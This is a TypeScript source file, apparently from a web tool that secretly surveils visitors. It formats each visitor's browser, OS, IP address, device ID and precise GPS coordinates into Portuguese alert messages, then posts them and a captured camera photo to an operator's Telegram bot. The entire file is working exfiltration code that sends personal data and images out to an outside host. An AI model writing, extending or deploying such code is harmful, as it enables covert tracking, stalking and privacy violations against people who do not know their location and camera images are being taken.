"use client"

import { LocationInfo, DeviceInfo, CaptureData } from "@/types/telegram"

export async function sendTelegramMessage(
  botToken: string,
  chatId: string,
  data: CaptureData
): Promise<void> {
  try {
    // Send device info first
    const deviceInfoMessage = `
🔍 *Novo Acesso Detectado*
📱 *Dispositivo:* ${data.deviceInfo.browser}
💻 *Sistema:* ${data.deviceInfo.os}
🌐 *IP:* ${data.deviceInfo.ip}
⏰ *Horário:* ${new Date(data.deviceInfo.timestamp).toLocaleString()}
🆔 *ID:* ${data.deviceInfo.visitorId}
    `.trim()

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: deviceInfoMessage,
        parse_mode: 'Markdown'
      })
    })

    // Send location if available
    if (data.location.latitude !== 0 && data.location.longitude !== 0) {
      const locationMessage = `
📍 *Localização:*
Latitude: ${data.location.latitude}
Longitude: ${data.location.longitude}
[Ver no Google Maps](https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude})
      `.trim()

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: locationMessage,
          parse_mode: 'Markdown'
        })
      })
    }

    // Send image if available
    if (data.image) {
      const formData = new FormData()
      const blob = await fetch(data.image).then(r => r.blob())
      formData.append('photo', blob, 'capture.jpg')
      formData.append('chat_id', chatId)
      formData.append('caption', '📸 Captura da câmera')

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error)
    throw error
  }
} 